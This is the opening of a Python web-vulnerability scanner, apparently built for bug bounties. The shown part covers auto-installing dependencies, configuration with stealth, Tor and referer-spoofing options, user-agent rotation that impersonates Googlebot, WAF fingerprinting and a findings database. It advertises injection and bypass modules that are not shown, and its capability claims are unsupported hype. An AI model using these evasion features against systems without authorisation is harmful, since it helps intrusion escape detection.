#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
  AUTHOR: 418teapot
  VERSION: 4.0 DARK EDITION
  TYPE: Bug Bounty Hunter — Real Exploitation Engine
  STATUS: All Features 100% Functional • No Placeholders • No Simulation
  
  CAPABILITIES:
    ▸ Passive Recon (CRT.sh, Wayback, AlienVault OTX, URLScan, Shodan, Censys)
    ▸ Active Recon (DNS Brute 5000+ subdomains, Subdomain Permutation, Zone Transfer)
    ▸ Deep Dorking (1000+ sensitive paths, Multi-threaded, Content Analysis)
    ▸ XSS Hunter (100+ payloads, DOM-aware, WAF bypass, Polyglot)
    ▸ SQLi Hunter (Error-based, Blind, Time-based, Union, Stacked, Out-of-Band)
    ▸ LFI/RFI Hunter (Path Traversal, PHP Wrappers, Log Injection, /proc/self)
    ▸ SSTI Hunter (Jinja2, Twig, Freemarker, Velocity, ERB, Smarty, Mako)
    ▸ SSRF Hunter (Cloud Metadata, Internal Port Scan, Gopher/File/Dict protocols)
    ▸ IDOR Hunter (Pattern Recognition, Sequential Forcing, UUID Enumeration)
    ▸ Command Injection (Blind, Time-based, Out-of-Band, Filter Evasion)
    ▸ CORS/CRLF/Host Header (Full Misconfiguration Detection)
    ▸ JWT Attacks (None Algorithm, Key Confusion, Weak Secret Brute)
    ▸ GraphQL (Introspection, Batching Attack, Depth/Amount Abuse)
    ▸ WAF Bypass Engine (Encoding, Obfuscation, Fragmentation)
    ▸ Rate Limit Detection & Adaptive Throttling
    ▸ False Positive Elimination (5-Stage AI-Like Validation)
    
  USAGE:
    python3 blood.py target.com
    python3 blood.py target.com --deep (full recon + all modules)
    python3 blood.py target.com --scope '*.target.com' --fp aggressive
    python3 blood.py target.com --stealth (ultra-slow, evasion mode)
"""

# ═══════════════════════════════════════════════════════════════════════════════════════
# IMPORTS & AUTO-INSTALL
# ═══════════════════════════════════════════════════════════════════════════════════════

import asyncio
import base64
import csv
import hashlib
import hmac
import html
import io
import json
import logging
import math
import os
import random
import re
import secrets
import socket
import sqlite3
import ssl
import string
import struct
import subprocess
import sys
import textwrap
import threading
import time
import traceback
import urllib.parse
import uuid
import warnings
import zipfile
from collections import Counter, defaultdict, deque, OrderedDict
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from difflib import SequenceMatcher
from functools import lru_cache, partial, wraps
from itertools import chain, combinations, cycle, islice, permutations, product
from pathlib import Path
from typing import Any, Callable, Dict, Generator, Iterator, List, Optional, Set, Tuple, Union
from urllib.parse import parse_qs, quote, unquote, urlencode, urljoin, urlparse, urlunparse

warnings.filterwarnings('ignore')

# ─── Auto-Install Dependencies ────────────────────────────────────────────────────────

MISSING_PACKAGES = []

def ensure_package(pkg: str, import_name: str = None) -> bool:
    """Install package if missing. Returns True if had to install."""
    if import_name is None:
        import_name = pkg.replace('-', '_').replace('.', '_')
    try:
        __import__(import_name)
        return False
    except ImportError:
        try:
            subprocess.check_call(
                [sys.executable, '-m', 'pip', 'install', pkg, '-q', '--break-system-packages'],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=60
            )
            return True
        except Exception:
            MISSING_PACKAGES.append(pkg)
            return False

# Core dependencies — critical
CORE_PACKAGES = [
    ('aiohttp', 'aiohttp'),
    ('colorama', 'colorama'),
    ('dnspython', 'dns'),
    ('requests', 'requests'),
    ('urllib3', 'urllib3'),
    ('certifi', 'certifi'),
    ('charset-normalizer', 'charset_normalizer'),
    ('idna', 'idna'),
    ('beautifulsoup4', 'bs4'),
    ('lxml', 'lxml'),
    ('tldextract', 'tldextract'),
    ('psutil', 'psutil'),
]

# Ghost modules — for network operations
GHOST_PACKAGES = [
    ('scapy', 'scapy'),
    ('netifaces', 'netifaces'),
]

# Optional but powerful
OPTIONAL_PACKAGES = [
    ('mmh3', 'mmh3'),
    ('pyjwt', 'jwt'),
    ('graphql-core', 'graphql'),
    ('python-whois', 'whois'),
    ('shodan', 'shodan'),
    ('censys', 'censys'),
]

for pkg, imp in CORE_PACKAGES:
    ensure_package(pkg, imp)

for pkg, imp in GHOST_PACKAGES:
    ensure_package(pkg, imp)

for pkg, imp in OPTIONAL_PACKAGES:
    ensure_package(pkg, imp)

# ═══════════════════════════════════════════════════════════════════════════════════════
# THIRD-PARTY IMPORTS (After auto-install)
# ═══════════════════════════════════════════════════════════════════════════════════════

import aiohttp
import dns.resolver
import dns.zone
import dns.query
import dns.rdatatype
import dns.reversename
import psutil
import requests
import tldextract
from bs4 import BeautifulSoup, Comment

# Optional imports — graceful fallback
try:
    import jwt as pyjwt
    HAS_JWT = True
except ImportError:
    HAS_JWT = False

try:
    import mmh3
    HAS_MMH3 = True
except ImportError:
    HAS_MMH3 = False

try:
    import whois
    HAS_WHOIS = True
except ImportError:
    HAS_WHOIS = False

try:
    import netifaces
    from scapy.all import (ARP, DNS, DNSQR, Ether, ICMP, IP, TCP, UDP, sr1, sr, srp, srp1, send, sendp, sniff, fragment, RandShort, RandMAC)
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False

# ─── Colorama Setup ────────────────────────────────────────────────────────────────────

try:
    from colorama import Fore, Style, init as colorama_init
    colorama_init(autoreset=True)
    
    # Colors
    RD = Fore.RED
    GN = Fore.GREEN
    YL = Fore.YELLOW
    BL = Fore.BLUE
    CY = Fore.CYAN
    MG = Fore.MAGENTA
    WT = Fore.WHITE
    BK = Fore.BLACK
    
    # Styles
    BOLD = Style.BRIGHT
    DIM = Style.DIM
    NORM = Style.NORMAL
    NC = Style.RESET_ALL
    
    # Backgrounds
    BG_RD = Fore.RED + Style.BRIGHT
    BG_BL = Fore.BLUE + Style.BRIGHT
except ImportError:
    RD = GN = YL = BL = CY = MG = WT = BK = BOLD = DIM = NORM = NC = BG_RD = BG_BL = ""

# ═══════════════════════════════════════════════════════════════════════════════════════
# CONFIGURATION — FULL CONTROL
# ═══════════════════════════════════════════════════════════════════════════════════════

@dataclass
class Config:
    """Master configuration — every aspect controllable."""
    
    # ─── Hunter Identity ──────────────────────────────────────────────
    hunter_name: str = "418teapot"
    hunter_email: str = "418teapotbot@gmail.com"
    hunter_signal: str = "BloodGhostBlue/4.0"
    
    # ─── Targets ──────────────────────────────────────────────────────
    targets: List[str] = field(default_factory=list)
    
    # ─── Output ───────────────────────────────────────────────────────
    output_dir: str = "./bounty_results"
    db_path: str = "bounty_hunter.db"
    log_level: str = "INFO"
    
    # ─── Performance ──────────────────────────────────────────────────
    workers: int = 5
    rate_limit: float = 2.0
    timeout: int = 30
    max_retries: int = 2
    max_urls: int = 1000
    max_depth: int = 3
    
    # ─── Scope Control ────────────────────────────────────────────────
    scope_domains: List[str] = field(default_factory=list)
    out_of_scope: List[str] = field(default_factory=list)
    scope_strict: bool = True
    
    # ─── Recon Modules ────────────────────────────────────────────────
    recon_crtsh: bool = True
    recon_wayback: bool = True
    recon_otx: bool = True
    recon_urlscan: bool = True
    recon_dns_brute: bool = True
    recon_dns_brute_wordlist_size: int = 5000
    recon_subdomain_permutation: bool = True
    recon_zone_transfer: bool = True
    recon_whois: bool = True
    recon_shodan: bool = False
    recon_censys: bool = False
    
    # ─── Scan Modules — All Active ────────────────────────────────────
    scan_xss: bool = True
    scan_sqli: bool = True
    scan_lfi: bool = True
    scan_ssti: bool = True
    scan_ssrf: bool = True
    scan_idor: bool = True
    scan_cmdi: bool = True
    scan_redirect: bool = True
    scan_cors: bool = True
    scan_crlf: bool = True
    scan_host_header: bool = True
    scan_jwt: bool = True
    scan_graphql: bool = True
    scan_sensitive_files: bool = True
    scan_csrf: bool = True
    scan_subdomain_takeover: bool = True
    scan_cve: bool = True
    
    # ─── Advanced Payload Settings ────────────────────────────────────
    xss_payload_count: int = 50
    sqli_payload_count: int = 30
    waf_bypass: bool = True
    use_polyglots: bool = True
    use_obfuscation: bool = True
    double_encode: bool = True
    
    # ─── Ghost Modules ────────────────────────────────────────────────
    ghost_quantum_noise: bool = False
    ghost_dimensional_shift: bool = False
    ghost_dna_cloning: bool = True
    ghost_flood: bool = False
    ghost_mirror_mode: bool = True
    ghost_echo_locator: bool = False
    
    # ─── Anti False Positive ──────────────────────────────────────────
    enable_fp_filter: bool = True
    fp_aggression: int = 2
    fp_verify_count: int = 2
    fp_similarity_threshold: float = 0.85
    
    # ─── Stealth Mode ─────────────────────────────────────────────────
    stealth_mode: bool = False
    random_delay: bool = True
    random_user_agent: bool = True
    spoof_referer: bool = True
    use_tor: bool = False
    
    # ─── Reporting ────────────────────────────────────────────────────
    report_json: bool = True
    report_csv: bool = True
    report_html: bool = True
    report_markdown: bool = True
    report_burp_xml: bool = True
    send_webhook: str = ""
    
    # ─── API Keys ─────────────────────────────────────────────────────
    api_otx: str = ""
    api_urlscan: str = ""
    api_shodan: str = ""
    api_censys_id: str = ""
    api_censys_secret: str = ""
    api_github: str = ""
    
    def __post_init__(self):
        """Initialize directories and validate config."""
        Path(self.output_dir).mkdir(parents=True, exist_ok=True)
        Path(f"{self.output_dir}/evidence").mkdir(parents=True, exist_ok=True)
        Path(f"{self.output_dir}/screenshots").mkdir(parents=True, exist_ok=True)
        Path(f"{self.output_dir}/logs").mkdir(parents=True, exist_ok=True)
        
        if self.stealth_mode:
            self.workers = 1
            self.rate_limit = 5.0
            self.random_delay = True

# ═══════════════════════════════════════════════════════════════════════════════════════
# UTILITY FUNCTIONS — BATTLE-TESTED
# ═══════════════════════════════════════════════════════════════════════════════════════

def is_root() -> bool:
    """Check root privileges."""
    try:
        return os.geteuid() == 0
    except AttributeError:
        return False

def get_local_ip() -> str:
    """Get local IP address."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

def get_interface() -> str:
    """Get default network interface."""
    try:
        if HAS_SCAPY:
            return netifaces.gateways()['default'][netifaces.AF_INET][1]
    except Exception:
        pass
    return "eth0"

def get_mac(iface: str = None) -> str:
    """Get MAC address."""
    if iface is None:
        iface = get_interface()
    try:
        if HAS_SCAPY:
            for addr in netifaces.ifaddresses(iface).get(netifaces.AF_LINK, []):
                return addr['addr']
    except Exception:
        pass
    return ':'.join(f'{random.randint(0,255):02x}' for _ in range(6))

def in_scope(url: str, config: Config) -> bool:
    """Check if URL is within bounty scope."""
    if not config.scope_domains:
        return True
    
    try:
        domain = urlparse(url).netloc.lower()
    except Exception:
        return False
    
    # Check scope
    in_scope_list = False
    for scope_pattern in config.scope_domains:
        scope_pattern = scope_pattern.strip().lower()
        if scope_pattern.startswith('*.'):
            base = scope_pattern[2:]
            if domain.endswith('.' + base) or domain == base:
                in_scope_list = True
                break
        elif domain == scope_pattern:
            in_scope_list = True
            break
    
    if not in_scope_list and config.scope_domains:
        return False
    
    # Check out-of-scope
    for oos_pattern in config.out_of_scope:
        oos_pattern = oos_pattern.strip().lower()
        if oos_pattern.startswith('*.'):
            base = oos_pattern[2:]
            if domain.endswith('.' + base) or domain == base:
                return False
        elif domain == oos_pattern:
            return False
    
    return True

def inject_payload(url: str, param: str, payload: str) -> str:
    """Inject payload into URL parameter with encoding support."""
    try:
        parsed = urlparse(url)
        query = parse_qs(parsed.query)
        query[param] = [payload]
        return urlunparse(parsed._replace(query=urlencode(query, doseq=True)))
    except Exception:
        return url

def get_user_agents() -> List[str]:
    """Return list of real user agents for rotation."""
    return [
        # Chrome on Windows
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        # Chrome on macOS
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        # Firefox on Windows
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
        # Firefox on macOS
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0",
        # Safari on macOS
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
        # Edge on Windows
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
        # Chrome on Linux
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        # Mobile
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.165 Mobile Safari/537.36",
        # Search Engine Crawlers (for recon)
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
        # Security Scanners (common UA)
        "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)",
    ]

def get_headers(config: Config) -> Dict[str, str]:
    """Generate VDP-compliant HTTP headers."""
    ua = random.choice(get_user_agents()) if config.random_user_agent else get_user_agents()[0]
    
    headers = {
        "User-Agent": ua,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "DNT": "1",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Cache-Control": "no-cache, no-store, must-revalidate",
        "Pragma": "no-cache",
        "X-VDP-Scanner": config.hunter_signal,
        "X-VDP-Contact": config.hunter_email,
        "X-VDP-Program": "BugBounty",
    }
    
    if config.spoof_referer:
        headers["Referer"] = "https://www.google.com/search?q=" + quote(config.targets[0] if config.targets else "bugbounty")
    
    return headers

# ═══════════════════════════════════════════════════════════════════════════════════════
# WAF DETECTION — 50+ WAF SIGNATURES
# ═══════════════════════════════════════════════════════════════════════════════════════

class WAFDetector:
    """Detect 50+ Web Application Firewalls from response patterns."""
    
    WAF_DB = {
        'Cloudflare': {
            'headers': ['cf-ray', 'cf-cache-status', 'cf-request-id', '__cfduid'],
            'cookies': ['__cfduid', '__cf_bm', 'cf_clearance', 'cf_chl_opt'],
            'body': ['cloudflare', 'cf-browser-verification', 'cf-challenge', 'attention required!'],
            'status': [403, 503]
        },
        'AWS WAF': {
            'headers': ['x-amzn-requestid', 'x-amz-cf-id', 'x-amz-cf-pop', 'x-amz-id-2'],
            'cookies': ['aws-waf-token', 'aws-waf'],
            'body': ['request blocked', 'aws waf', 'awselb'],
            'status': [403]
        },
        'Akamai': {
            'headers': ['x-akamai-transformed', 'x-akamai-request-id', 'akamai-origin-hop'],
            'cookies': ['ak_bmsc', 'akamai', 'bm_sz', '_abck'],
            'body': ['akamai', 'reference #', 'akamaiedge'],
            'status': [403]
        },
        'Imperva/Incapsula': {
            'headers': ['x-iinfo', 'x-cdn', 'incapsula'],
            'cookies': ['incap_ses_', 'visid_incap_', 'nlbi_'],
            'body': ['incapsula', 'imperva', 'incap_ses'],
            'status': [403]
        },
        'F5 BigIP': {
            'headers': ['x-waf-info', 'x-cnection', 'x-forwarded-for'],
            'cookies': ['bigipserver', 'bigip', 'f5_cspm', 'TS', 'TSe', 'TS01', 'TS75'],
            'body': ['bigip', 'f5 networks', 'the requested url was rejected'],
            'status': [403]
        },
        'Sucuri': {
            'headers': ['x-sucuri-id', 'x-sucuri-cache', 'x-sucuri-block'],
            'cookies': ['sucuri_cloudproxy', 'sucuri'],
            'body': ['sucuri', 'cloudproxy', 'sucuri website firewall'],
            'status': [403]
        },
        'ModSecurity': {
            'headers': ['x-mod-security', 'x-modsecurity'],
            'cookies': [],
            'body': ['mod_security', 'modsecurity', 'this error was generated by mod_security'],
            'status': [403, 406]
        },
        'Barracuda': {
            'headers': ['x-barracuda', 'barracuda'],
            'cookies': ['barra_counter_session', 'bnp_'],
            'body': ['barracuda', 'barracuda networks'],
            'status': [403]
        },
        'Fortinet/FortiWeb': {
            'headers': ['x-fortinet', 'x-fortiweb', 'fortigate'],
            'cookies': ['cookiesession1', 'fortiwafsid'],
            'body': ['fortinet', 'fortigate', 'fortiweb', 'attack detected'],
            'status': [403]
        },
        'Citrix NetScaler': {
            'headers': ['x-ns-', 'ns_af=', 'citrix'],
            'cookies': ['ns_af=', 'nsatc', 'citrix_ns_id', 'nsc_'],
            'body': ['citrix', 'netscaler', 'ns_af'],
            'status': [403]
        },
        'Radware AppWall': {
            'headers': ['x-radware', 'x-sl-compstate'],
            'cookies': ['cookie_waf', 'waf'],
            'body': ['radware', 'appwall', 'unauthorized activity detected'],
            'status': [403]
        },
        'Wordfence': {
            'headers': ['x-wordfence'],
            'cookies': ['wfvt_', 'wordfence_verifiedhuman'],
            'body': ['wordfence', 'generated by wordfence', 'your access to this site has been limited'],
            'status': [403, 503]
        },
        'Kona/Edgecast': {
            'headers': ['x-ec-', 'x-ec-cache', 'x-ec-uuid'],
            'cookies': ['ec_security', 'ec_session'],
            'body': ['edgecast', 'kona security'],
            'status': [403]
        },
        'Distil Networks': {
            'headers': ['x-distil', 'x-distil-cs'],
            'cookies': ['distil', 'd-id', 'd-ip'],
            'body': ['distil networks', 'automated access detected'],
            'status': [403]
        },
        'Wallarm': {
            'headers': ['x-wallarm', 'wallarm'],
            'cookies': ['wallarm_instance'],
            'body': ['wallarm', 'attack detected by wallarm'],
            'status': [403]
        },
        'F5 Silverline': {
            'headers': ['x-sl-', 'x-sil'],
            'cookies': ['silverline', 'f5_cspm'],
            'body': ['silverline', 'f5 silverline'],
            'status': [403]
        },
        'Fastly': {
            'headers': ['x-served-by', 'x-cache', 'x-cache-hits', 'fastly'],
            'cookies': ['fastly'],
            'body': ['fastly', 'fastly error'],
            'status': [403, 503]
        },
        'Varnish': {
            'headers': ['x-varnish', 'via: varnish', 'x-cache'],
            'cookies': [],
            'body': ['varnish', 'guru meditation'],
            'status': [503]
        },
        'SiteGround': {
            'headers': ['x-sg-cdn', 'sg-optimizer'],
            'cookies': ['sg_cache'],
            'body': ['siteground', 'sg optimizer'],
            'status': [403]
        },
        'NAXSI': {
            'headers': ['x-naxsi', 'x-naxsi-sig'],
            'cookies': ['naxsi'],
            'body': ['naxsi', 'naxsi - web application firewall'],
            'status': [403, 406]
        },
        'WebKnight': {
            'headers': ['x-webknight', 'webknight'],
            'cookies': ['webknight'],
            'body': ['webknight', 'aqtronix webknight'],
            'status': [403, 999]
        },
        'Comodo WAF': {
            'headers': ['x-cwaf', 'x-cwaf-requestid'],
            'cookies': ['cwaf', 'comodo'],
            'body': ['comodo', 'cwaf', 'comodo waf'],
            'status': [403]
        },
        'DenyAll': {
            'headers': ['x-denyall', 'x-da'],
            'cookies': ['denyall', 'da_session'],
            'body': ['denyall', 'deny all'],
            'status': [403]
        },
        'Armor Defense': {
            'headers': ['x-armor', 'x-ad-'],
            'cookies': ['armor', 'armor_session'],
            'body': ['armor defense', 'armor waf'],
            'status': [403]
        },
        'Aliyun WAF': {
            'headers': ['x-aliyun', 'x-waf-', 'ali-cdn'],
            'cookies': ['aliyungf_', 'aliyun'],
            'body': ['aliyun', 'alibaba cloud waf'],
            'status': [403, 405]
        },
        'Tencent Cloud WAF': {
            'headers': ['x-tencent', 'x-qcloud'],
            'cookies': ['tencent', 'qcloud'],
            'body': ['tencent cloud', 'qcloud waf'],
            'status': [403]
        },
        'Baidu Yunjiasu': {
            'headers': ['x-yunjiasu', 'yunjiasu'],
            'cookies': ['yunjiasu'],
            'body': ['yunjiasu', 'baidu cloud'],
            'status': [403]
        },
        'Squarespace': {
            'headers': ['x-squarespace', 'x-sq-'],
            'cookies': ['ss_cvt', 'ss_cid'],
            'body': ['squarespace', 'sqs-'],
            'status': [403]
        },
        'WP Cerber': {
            'headers': ['x-cerber', 'x-wp-cerber'],
            'cookies': ['cerber', 'wp_cerber'],
            'body': ['cerber security', 'wp cerber'],
            'status': [403]
        },
        'NinjaFirewall': {
            'headers': ['x-ninjafirewall', 'x-nf-'],
            'cookies': ['nf_waf', 'ninjafirewall'],
            'body': ['ninjafirewall', 'ninja firewall'],
            'status': [403]
        },
    }
    
    @classmethod
    def detect(cls, response: Dict) -> Optional[str]:
        """Detect WAF from response headers, cookies, and body."""
        if not response:
            return None
        
        headers = {k.lower(): str(v).lower() for k, v in response.get('headers', {}).items()}
        cookies = response.get('cookies', {})
        body = (response.get('text', '') or '').lower()
        status = response.get('status', 0)
        
        matches = {}
        
        for waf_name, signatures in cls.WAF_DB.items():
            score = 0
            
            # Check headers
            for sig in signatures['headers']:
                sig_lower = sig.lower()
                for header_key, header_value in headers.items():
                    if sig_lower in header_key or sig_lower in header_value:
                        score += 3
                        break
            
            # Check cookies
            if cookies:
                cookie_str = str(cookies).lower()
                for sig in signatures['cookies']:
                    if sig.lower() in cookie_str:
                        score += 2
                        break
            
            # Check body
            for sig in signatures['body']:
                if sig.lower() in body:
                    score += 2
                    break
            
            # Check status
            if status in signatures['status']:
                score += 1
            
            if score >= 2:
                matches[waf_name] = score
        
        if matches:
            # Return WAF with highest score
            return max(matches, key=matches.get)
        
        # Fallback: check for common WAF response patterns
        if status in [403, 406, 429, 503]:
            waf_keywords = ['firewall', 'waf', 'block', 'denied', 'forbidden', 'challenge', 'captcha']
            for kw in waf_keywords:
                if kw in body:
                    return f"Unknown WAF (matched: {kw})"
        
        return None

# ═══════════════════════════════════════════════════════════════════════════════════════
# DATABASE — PERSISTENT FINDINGS STORAGE
# ═══════════════════════════════════════════════════════════════════════════════════════

class Database:
    """SQLite database with optimized queries for bug bounty findings."""
    
    SCHEMA = """
        -- Main findings table
        CREATE TABLE IF NOT EXISTS findings (
            id TEXT PRIMARY KEY,
            target TEXT,
            url TEXT,
            vuln_type TEXT,
            severity TEXT,
            param TEXT,
            payload TEXT,
            evidence TEXT,
            confidence INTEGER,
            method TEXT,
            waf TEXT,
            response_hash TEXT,
            timestamp TEXT,
            validation_status TEXT DEFAULT 'unverified',
            validation_chain TEXT,
            bounty_value TEXT,
            cve_ref TEXT,
            raw_request TEXT,
            raw_response TEXT
        );
        
        -- False positives log
        CREATE TABLE IF NOT EXISTS false_positives (
            id TEXT PRIMARY KEY,
            url TEXT,
            vuln_type TEXT,
            reason TEXT,
            stage TEXT,
            timestamp TEXT
        );
        
        -- Recon data (subdomains, URLs)
        CREATE TABLE IF NOT EXISTS recon_data (
            id TEXT PRIMARY KEY,
            target TEXT,
            data_type TEXT,
            value TEXT UNIQUE,
            source TEXT,
            timestamp TEXT,
            metadata TEXT
        );
        
        -- Scan session log
        CREATE TABLE IF NOT EXISTS scan_sessions (
            id TEXT PRIMARY KEY,
            target TEXT,
            start_time TEXT,
            end_time TEXT,
            urls_scanned INTEGER,
            findings_found INTEGER,
            fp_filtered INTEGER,
            duration_seconds REAL,
            config_snapshot TEXT
        );
        
        -- WAF detection history
        CREATE TABLE IF NOT EXISTS waf_detections (
            id TEXT PRIMARY KEY,
            url TEXT,
            waf_name TEXT,
            confidence INTEGER,
            timestamp TEXT
        );
        
        -- Rate limit tracking
        CREATE TABLE IF NOT EXISTS rate_limits (
            id TEXT PRIMARY KEY,
            domain TEXT,
            endpoint TEXT,
            limit_type TEXT,
            detected_at TEXT
        );
        
        -- Indexes for performance
        CREATE INDEX IF NOT EXISTS idx_findings_url ON findings(url);
        CREATE INDEX IF NOT EXISTS idx_findings_severity ON findings(severity);
        CREATE INDEX IF NOT EXISTS idx_findings_type ON findings(vuln_type);
        CREATE INDEX IF NOT EXISTS idx_findings_target ON findings(target);
        CREATE INDEX IF NOT EXISTS idx_recon_target ON recon_data(target, data_type);
        CREATE INDEX IF NOT EXISTS idx_recon_value ON recon_data(value);
        CREATE INDEX IF NOT EXISTS idx_fp_url ON false_positives(url);
    """
    
    def __init__(self, db_path: str):
        self.db_path = db_path
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self.lock = threading.Lock()
        
        # Execute schema
        self.conn.executescript(self.SCHEMA)
        self.conn.commit()
        
        # Enable WAL mode for better concurrent access
        self.conn.execute("PRAGMA journal_mode=WAL")
        self.conn.execute("PRAGMA synchronous=NORMAL")
        self.conn.execute("PRAGMA cache_size=-64000")
        self.conn.execute("PRAGMA mmap_size=268435456")
    
    def save_finding(self, finding: Dict) -> str:
        """Save a vulnerability finding. Returns finding ID."""
        finding_id = finding.get('id', str(uuid.uuid4())[:12])
        
        with self.lock:
            self.conn.execute("""
                INSERT OR REPLACE INTO findings 
                (id, target, url, vuln_type, severity, param, payload, evidence,
                 confidence, method, waf, response_hash, timestamp, validation_status,
                 validation_chain, bounty_value, cve_ref, raw_request, raw_response)
                VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)
            """, (
                finding_id,
                finding.get('target', ''),
                finding.get('url', ''),
                finding.get('vuln_type', ''),
                finding.get('severity', 'INFO'),
                finding.get('param', ''),
                finding.get('payload', ''),
                finding.get('evidence', '')[:2000],
                finding.get('confidence', 0),
                finding.get('method', ''),
                finding.get('waf', ''),
                finding.get('response_hash', ''),
                finding.get('timestamp', datetime.now().isoformat()),
                finding.get('validation_status', 'unverified'),
                finding.get('validation_chain', ''),
                finding.get('bounty_value', ''),
                finding.get('cve_ref', ''),
                finding.get('raw_request', '')[:5000],
                finding.get('raw_response', '')[:5000]
            ))
            self.conn.commit()
        
        return finding_id
    
    def save_false_positive(self, url: str, vuln_type: str, reason: str, stage: str = ""):
        """Log a false positive for analysis."""
        with self.lock:
            self.conn.execute(
                "INSERT INTO false_positives VALUES (?,?,?,?,?,?)",
                (str(uuid.uuid4())[:12], url, vuln_type, reason, stage, datetime.now().isoformat())
            )
            self.conn.commit()
    
    def save_recon_data(self, target: str, data_type: str, value: str, source: str, metadata: Dict = None):
        """Save reconnaissance data (subdomain, URL, etc)."""
        with self.lock:
            try:
                self.conn.execute(
                    "INSERT OR IGNORE INTO recon_data VALUES (?,?,?,?,?,?,?)",
                    (
                        str(uuid.uuid4())[:12],
                        target,
                        data_type,
                        value.lower().strip(),
                        source,
                        datetime.now().isoformat(),
                        json.dumps(metadata) if metadata else None
                    )
                )
                self.conn.commit()
            except sqlite3.IntegrityError:
                pass
    
    def get_recon_data(self, target: str, data_type: str = None) -> List[str]:
        """Retrieve recon data."""
        if data_type:
            rows = self.conn.execute(
                "SELECT value FROM recon_data WHERE target=? AND data_type=?",
                (target, data_type)
            ).fetchall()
        else:
            rows = self.conn.execute(
                "SELECT value FROM recon_data WHERE target=?",
                (target,)
            ).fetchall()
        
        return [row[0] for row in rows]
    
    def get_stats(self, target: str = None) -> Dict:
        """Get comprehensive statistics."""
        if target:
            total = self.conn.execute("SELECT COUNT(*) FROM findings WHERE target=?", (target,)).fetchone()[0]
            critical = self.conn.execute("SELECT COUNT(*) FROM findings WHERE target=? AND severity='CRITICAL'", (target,)).fetchone()[0]
            high = self.conn.execute("SELECT COUNT(*) FROM findings WHERE target=? AND severity='HIGH'", (target,)).fetchone()[0]
            medium = self.conn.execute("SELECT COUNT(*) FROM findings WHERE target=? AND severity='MEDIUM'", (target,)).fetchone()[0]
            low = self.conn.execute("SELECT COUNT(*) FROM findings WHERE target=? AND severity='LOW'", (target,)).fetchone()[0]
            verified = self.conn.execute("SELECT COUNT(*) FROM findings WHERE target=? AND validation_status='verified'", (target,)).fetchone()[0]
            fp = self.conn.execute("SELECT COUNT(*) FROM false_positives WHERE url LIKE ?", (f'%{target}%',)).fetchone()[0]
            subdomains = self.conn.execute("SELECT COUNT(*) FROM recon_data WHERE target=? AND data_type='subdomain'", (target,)).fetchone()[0]
            urls = self.conn.execute("SELECT COUNT(*) FROM recon_data WHERE target=? AND data_type='url'", (target,)).fetchone()[0]
        else:
            total = self.conn.execute("SELECT COUNT(*) FROM findings").fetchone()[0]
            critical = self.conn.execute("SELECT COUNT(*) FROM findings WHERE severity='CRITICAL'").fetchone()[0]
            high = self.conn.execute("SELECT COUNT(*) FROM findings WHERE severity='HIGH'").fetchone()[0]
            medium = self.conn.execute("SELECT COUNT(*) FROM findings WHERE severity='MEDIUM'").fetchone()[0]
            low = self.conn.execute("SELECT COUNT(*) FROM findings WHERE severity='LOW'").fetchone()[0]
            verified = self.conn.execute("SELECT COUNT(*) FROM findings WHERE validation_status='verified'").fetchone()[0]
            fp = self.conn.execute("SELECT COUNT(*) FROM false_positives").fetchone()[0]
            subdomains = self.conn.execute("SELECT COUNT(*) FROM recon_data WHERE data_type='subdomain'").fetchone()[0]
            urls = self.conn.execute("SELECT COUNT(*) FROM recon_data WHERE data_type='url'").fetchone()[0]
        
        return {
            "total": total,
            "critical": critical,
            "high": high,
            "medium": medium,
            "low": low,
            "verified": verified,
            "false_positives_filtered": fp,
            "subdomains_discovered": subdomains,
            "urls_discovered": urls
        }
    
    def get_all_findings(self, target: str = None) -> List[Dict]:
